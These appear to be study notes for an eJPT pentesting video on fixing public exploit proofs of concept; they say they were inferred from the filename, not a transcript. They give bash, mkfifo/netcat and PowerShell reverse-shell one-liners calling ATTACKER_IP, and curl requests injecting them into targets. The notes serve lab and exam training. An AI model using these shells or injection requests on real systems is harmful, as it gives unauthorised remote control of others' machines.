# 01 - Fixing Exploits

Note: The transcript for this video is not provided. The following summary is inferred conservatively from the filename and typical eJPT workflows around adapting public PoCs (ExploitDB/GitHub) so they actually work in lab targets.

## What the video covers (Introduction / big picture)
- How to take a public exploit/PoC that “doesn’t work” out of the box and make it work against your target.
- Common fixes: Python2→Python3 updates, missing dependencies, wrong endpoints/paths, HTTP header/cookie/CSRF handling, SSL/TLS issues, payload tuning (reverse shells), and minor logic/typing bugs.
- A repeatable workflow: verify the vuln, fetch the PoC, normalize it to your environment, test requests manually (curl/Burp), instrument the script for visibility, run with a listener, iterate, and document changes.

## Flow (ordered)
1. Verify target and version
   - Confirm the service/version is actually vulnerable (banner/enumeration/service docs).
2. Acquire the PoC
   - Use searchsploit or the original repo; read the exploit notes/usage carefully.
3. Normalize the environment
   - Convert Python2 PoCs; install required modules; fix line endings; make it executable.
4. Map and customize variables
   - Set RHOST/RPORT/LHOST/LPORT, base URL, endpoint paths, creds, cookies, CSRF, timeouts, SSL.
5. Choose a stable payload
   - Replace fragile commands (nc -e) with robust reverse shells (bash/PowerShell).
6. Dry run the request
   - Recreate the exploit requests with curl/Burp; confirm expected responses.
7. Add visibility
   - Print status codes, errors, cookies, and key values; enable verbose/logging.
8. Run with a listener
   - Start rlwrap/nc; execute the PoC; verify callback; adjust if needed.
9. Iterate and harden
   - Handle redirects, proxies, delays, bytes/str encoding; ensure idempotency/reliability.
10. Document changes
   - Save a patched copy; note exact flags/headers/paths for later use.

## Tools highlighted
- searchsploit (ExploitDB): find/read/mirror exploits
- Python 3, 2to3, pip: language compatibility and dependencies
- curl and Burp Suite: replicate and debug HTTP requests
- netcat (nc) / rlwrap / socat: listeners and shell stabilization
- msfvenom (optional): generate staged/unstaged payloads
- dos2unix: fix line endings on PoCs
- sed/grep: quick in-place tweaks and code review
- Paths: /usr/share/exploitdb/exploits, /usr/share/exploitdb/files_exploits.csv

## Typical command walkthrough (detailed, copy-paste friendly)
Only run against systems you own or have explicit permission to test.

- Find and fetch a PoC
```
searchsploit <product> <version>
searchsploit -x <EDB-ID>              # view exploit details inline
searchsploit -m <EDB-ID>              # mirror exploit locally
# or copy from GitHub to the working dir
```

- Normalize files and Python environment
```
dos2unix exploit.py
2to3 -w exploit.py                     # convert Python2 PoC to Python3
python3 -m venv venv && source venv/bin/activate
pip install --upgrade pip setuptools wheel
pip install requests urllib3           # common web PoC deps
chmod +x exploit.py
```

- Quick Python3 fixes you’ll often need (if errors appear)
  - raw_input -> input
  - print "x" -> print("x")
  - bytes/str: sock.send(payload.encode()) or .decode() as needed
  - urllib2 -> requests; add verify=False and timeouts
  - Add argparse for clean RHOST/LHOST inputs if missing

- Prepare a listener and payload
```
export LHOST=ATTACKER_IP
export LPORT=4444
rlwrap nc -lvnp $LPORT
```

- Common reverse shell one-liners to drop into PoCs
  - Linux bash:
```
bash -c 'bash -i >& /dev/tcp/'"$LHOST"'/'"$LPORT"' 0>&1'
```
  - Linux mkfifo (if bash -i blocked):
```
mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc '"$LHOST"' '"$LPORT"' >/tmp/f
```
  - Windows PowerShell:
```
powershell -nop -w hidden -c "$client = New-Object System.Net.Sockets.TCPClient('$LHOST',$LPORT);$stream = $client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String );$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([Text.Encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

- Dry run the HTTP request with curl (adjust URL/headers/body)
```
export TARGET=http://TARGET:PORT
curl -i -s -k "$TARGET/vuln/endpoint" \
  -H "User-Agent: Mozilla/5.0" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "param1=value&cmd=$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))' "bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'")"
```

- Add proxies and SSL tweaks (when debugging in Burp)
```
export HTTP_PROXY=http://127.0.0.1:8080
export HTTPS_PROXY=http://127.0.0.1:8080
# in Python requests: proxies={'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}, verify=False
```

- Run the PoC (examples; flags vary by script)
```
python3 exploit.py --rhost TARGET --rport 80 --lhost $LHOST --lport $LPORT
# or
python3 exploit.py -u "$TARGET" -c "bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'"
```

- If a PoC needs compilation (local privesc, etc.)
```
gcc -o exploit exploit.c -Wall
# If 32-bit needed:
sudo apt-get install -y gcc-multilib
gcc -m32 -o exploit exploit.c
```

- Inspect responses and iterate quickly
```
# Print server response in PoC
print(resp.status_code, resp.headers.get('Set-Cookie'), resp.text[:200])
# Handle redirects in requests
requests.post(url, data=d, allow_redirects=True, verify=False, timeout=10)
```

## Practical tips
- Always read the PoC header/notes on ExploitDB; many list required paths, creds, or version caveats.
- Don’t trust defaults: update base paths (/app/, /admin/), endpoints, and parameters to match your target.
- SSL/TLS breaks many PoCs: add verify=False and timeouts; try -k with curl; account for redirects (301/302).
- Replicate the exploit manually first with curl/Burp to prove the request is valid before automating.
- Replace fragile payloads (nc -e) with portable shells (bash mkfifo or PowerShell).
- If a PoC needs a token/cookie, first GET the page to parse CSRF/cookies, then POST with them using a session.
- Add simple logging/prints to see status codes, redirect chains, and bodies when debugging.
- Never run untrusted PoCs as root; use a venv and non-privileged user; review code briefly for rm -rf or similar.
- Keep a patched copy with a note of exactly what you changed (use git or suffix “_fixed.py”).

## Minimal cheat sheet (one-screen flow)
```
# 1) Find and fetch PoC
searchsploit <product> <version>
searchsploit -m <EDB-ID>

# 2) Normalize
dos2unix exploit.py
2to3 -w exploit.py
python3 -m venv venv && source venv/bin/activate
pip install requests urllib3

# 3) Prep listener
export LHOST=ATTACKER_IP; export LPORT=4444
rlwrap nc -lvnp $LPORT

# 4) Prove request manually
export TARGET=http://TARGET:PORT
curl -i -s -k "$TARGET/vuln" \
  -H "User-Agent: Mozilla/5.0" \
  --data "cmd=$(python3 -c 'import urllib.parse;print(urllib.parse.quote(\"bash -c \\\"bash -i >& /dev/tcp/'"$LHOST"'/'"$LPORT"' 0>&1\\\"\"))')"

# 5) Tweak PoC
# - Set RHOST/RPORT/LHOST/LPORT/URL
# - Add verify=False, timeouts, allow_redirects
# - Use requests.Session(), capture cookies/CSRF

# 6) Run PoC
python3 exploit.py --rhost TARGET --rport 80 --lhost $LHOST --lport $LPORT

# 7) Iterate (headers, path, payload) until shell
```

## Summary
This video’s theme is turning “broken” public PoCs into working exploits by methodically normalizing the code, matching it to the target’s real endpoints and auth/CSRF/headers, fixing Python2→3 and dependency issues, and swapping in reliable reverse-shell payloads. Validate each step with curl/Burp, add visibility in the script, run with a listener, iterate small changes, and document your patches so you can reuse them during the exam.